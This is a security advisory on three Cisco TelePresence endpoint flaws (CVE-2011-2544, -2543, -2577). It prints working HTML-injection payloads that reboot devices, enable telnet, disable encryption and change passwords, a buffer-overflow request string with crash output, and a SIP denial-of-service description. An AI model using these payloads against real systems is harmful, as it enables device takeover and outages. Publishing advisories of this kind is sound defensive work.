Details.
Cisco TelePresence is an umbrella term for Video Conferencing Hardware
and Software, Infrastructure and Endpoints. The C & MXP Series are the
Endpoints used on desks or in boardrooms to provide users with a
termination point for Video Conferencing.

1. Post-authentication HTML Injection - CVE-2011-2544 (CSCtq46488):
Cisco TelePresence Endpoints have a web interface (HTTP or HTTPS) for
managing, configuring and reporting. It is possible to set the Call ID
(with H.323 or SIP) to a HTML value. If a call is made to another
endpoint and an authenticated user browses to the web interface on the
endpoint receiving the call (e.g. to view call statistics), the
HTML will render locally within the context of the logged in user. From
this point it is possible to make changes to the system as the
authenticated user. The flaw is due to the flexibility of the H.323 ID
or SIP Display Name fields and failure to correctly validate user input.

Examples (MXP):
Rebooting the system: <IMG SRC="/reboot&Yes=please">
The attacker may also choose to change passwords in the system, disable
encryption or enable telnet:
<IMG SRC=/html_select_status?reload=other.ssi&telnet=On>
<IMG SRC=/html_select_status?reload=security.ssi&/Configuration/
Conference/Encryption/Mode=Off&/Configuration/SystemUnit/Password=test>

2. Post-authentication Memory Corruption - CVE-2011-2543 (CSCtq46496):
Cisco TelePresence systems (Endpoints and Infrastructure) use XPath for
setting and getting configuration.

Example syntax is:
http://ip/getxml?location=/Configuration/Video
The request is sent to a locally listening shell (tshell). This is the
case for all requests relating to performing an action on the system (e.g.
config get or set). The shell then sends the input to the "main"
application (/app/main, id=0), and the data is passed as a parameter.

It was discovered that the getXML handle does not properly perform
length checking on the user supplied input before passing it to the
tshell. Furthermore, there is no length checking performed in the tshell
and no bounds checking performed in the main application where the
parameter is consumed. As such, it is possible to send input that
exceeds the size of the receiving buffer, subsequently causing an
invalid address to be read. This causes a reboot on the Endpoints. The
VCS will not reboot, the process will crash by SIGSEGV (or sigabrt) but
it will restart the process itself which drops all calls.

Proof of Concept: GET
/wsgi/getxml?location="+("A"*5200)+("\x60"*4)+("X"*4)+"HTTP/1.1\r\n
Host: 192.168.6.99\r\n\r\n"

Received signal SIGSEGV (11) in thread 0x129e8480, TID 2670
Illegal memory access at: 0x5858585c

NIP: 0f39abc8 MSR: 0000d032 OGPR3: 00000002

As you can see, the crash string is passed as a parameter in GPR 8.
The severity of this issue is compounded by the fact that the main
application runs as root, this could potentially lead to arbitrary code
execution.

3. Pre-authentication SIP Denial of Service - CVE-2011-2577 (CSCtq46500):
Cisco TelePresence Endpoints utilise SIP for the call setup protocol.
Sending a SIP INVITE with a 4x8 a"s in the MAC Address field and the
receive field causes the system to reboot.

Proof of Concept: MXP:
Exception 0x1100 : Data TLB load miss Active task
FsmMain FSM process : SipTrnsp(0) FSM message : SipTrnsp_Send_Msg_Req
from SipTrnsp(0) Data TLB miss (DMISS) : 0x00000000 (illegal addr.
accessed)

Solution.
Upgrade to TC4.2 for the C series to fix validation issues.
